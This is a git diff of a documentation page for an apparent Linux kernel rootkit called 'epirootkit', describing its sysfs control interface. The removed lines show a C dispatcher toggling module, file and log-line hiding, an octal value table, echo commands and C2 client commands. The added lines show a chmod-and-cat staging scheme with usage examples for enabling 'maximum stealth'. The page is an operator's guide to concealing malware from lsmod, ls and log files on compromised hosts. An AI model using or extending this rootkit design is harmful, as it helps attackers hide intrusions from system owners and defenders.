@@ -1,6 +1,6 @@
 ---
 title: "Sysfs Interface"
-description: "Linux sysfs interface with octal permission configuration for rootkit control"
+description: "Simple permission-based feature control"
 icon: "settings"
 date: "2025-05-30T00:00:00+01:00"
 lastmod: "2025-05-30T00:00:00+01:00"
@@ -11,85 +11,72 @@ weight: 513
 
 # Sysfs Interface
 
-Linux sysfs interface for rootkit control using octal permission-style configuration (like Linux file permissions).
+Simple two-step interface using file permissions to control rootkit features.
 
-## Implementation
+## How It Works
 
-```c
-/* Octal hide control (like file permissions)
- * 1: Module hidden    2: Files hidden    4: Lines hidden
- * Examples: 0=visible, 1=module, 3=module+files, 7=all hidden */
-
-static void update_hide_state(int mode)
-{
-    /* Module hiding (bit 0) */
-    if (mode & 1) {
-        if (!is_module_hidden()) hide_module();
-    } else {
-        if (is_module_hidden()) unhide_module();
-    }
-    
-    /* File hiding (bit 1) */
-    if (mode & 2) {
-        if (!is_file_hiding_enabled()) enable_file_hiding();
-    } else {
-        if (is_file_hiding_enabled()) disable_file_hiding();
-    }
-    
-    /* Line hiding (bit 2) */
-    if (mode & 4) {
-        if (!is_line_hiding_enabled()) enable_line_hiding();
-    } else {
-        if (is_line_hiding_enabled()) disable_line_hiding();
-    }
-}
-```
-
-Uses 3-bit octal system (0-7) where each bit controls a stealth feature.
-
-## Octal Values
-
-| Value | Binary | Module | Files | Lines | Description |
-|:-----:|:------:|:------:|:-----:|:-----:|:------------|
-| `0`   | `000`  | ❌     | ❌    | ❌    | All features disabled - rootkit fully visible |
-| `1`   | `001`  | ✅     | ❌    | ❌    | Hide rootkit module from `lsmod` |
-| `2`   | `010`  | ❌     | ✅    | ❌    | Hide rootkit files from `ls` |
-| `3`   | `011`  | ✅     | ✅    | ❌    | Hide both module and files |
-| `4`   | `100`  | ❌     | ❌    | ✅    | Hide rootkit traces from log files |
-| `5`   | `101`  | ✅     | ❌    | ✅    | Hide module and log traces |
-| `6`   | `110`  | ❌     | ✅    | ✅    | Hide files and log traces |
-| `7`   | `111`  | ✅     | ✅    | ✅    | Maximum stealth - all features enabled |
-
-## Usage
+Like git, changes require two steps:
+1. **Stage change** (`chmod`) - like `git commit`
+2. **Apply change** (`cat`/`echo`) - like `git push`
 
 ```bash
-# Read current state
-cat /sys/kernel/epirootkit/hide
-# Output: Current octal value (0-7)
-
-# Enable maximum stealth (all features)
-echo 7 > /sys/kernel/epirootkit/hide
-
-# Hide only module and files
-echo 3 > /sys/kernel/epirootkit/hide
-
-# Disable all hiding
-echo 0 > /sys/kernel/epirootkit/hide
-# Or use quick unhide
-echo 1 > /sys/kernel/epirootkit/unhide
+chmod 607 /sys/kernel/epirootkit/control  # Stage features (1+2+4=7)
+cat /sys/kernel/epirootkit/control        # Apply changes
 ```
 
-## Control
+## Permission Mapping
 
-### WebUI
-Configuration controlled via **[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)**
+Last 3 permission bits control features:
+- **Bit 1** (execute): Module hiding
+- **Bit 2** (write): File hiding  
+- **Bit 4** (read): Line hiding
 
-### C2 Commands
+## Usage Examples
+
 ```bash
-hide-module Client-1     # Sets bit 0 (echo 1 > hide)
-hide-files Client-1      # Sets bit 1 (echo 2 > hide)  
-hide-lines Client-1      # Sets bit 2 (echo 4 > hide)
-status Client-1          # Shows current hide_mode
+# Enable all features
+chmod 607 /sys/kernel/epirootkit/control  # Stage: all (7)
+cat /sys/kernel/epirootkit/control        # Apply
+
+# Enable only module hiding  
+chmod 601 /sys/kernel/epirootkit/control  # Stage: module (1)
+echo "apply" > /sys/kernel/epirootkit/control  # Apply
+
+# Disable everything
+chmod 600 /sys/kernel/epirootkit/control  # Stage: none (0)
+cat /sys/kernel/epirootkit/control        # Apply
 ```
 
-Provides Linux-native, permission-style configuration for all stealth features. 
+## Feature Combinations
+
+| chmod | Bits | Lines | Files | Module | Description |
+|:-----:|:----:|:-----:|:-----:|:------:|:------------|
+| ---   | 0    | ❌    | ❌    | ❌     | All disabled |
+| --x   | 1    | ❌    | ❌    | ✅     | Module only |
+| -w-   | 2    | ❌    | ✅    | ❌     | Files only |
+| -wx   | 3    | ❌    | ✅    | ✅     | Module + files |
+| r--   | 4    | ✅    | ❌    | ❌     | Lines only |
+| r-x   | 5    | ✅    | ❌    | ✅     | Module + lines |
+| rw-   | 6    | ✅    | ✅    | ❌     | Files + lines |
+| rwx   | 7    | ✅    | ✅    | ✅     | All enabled |
+
+## Status Output
+
+```bash
+cat /sys/kernel/epirootkit/control
+```
+
+**Example:**
+```
+module_hidden=yes
+file_hiding=yes  
+line_hiding=yes
+```
+
+## File Location
+
+```
+/sys/kernel/epirootkit/control
+```
+
+Two-step design ensures explicit control over when rootkit features activate. 
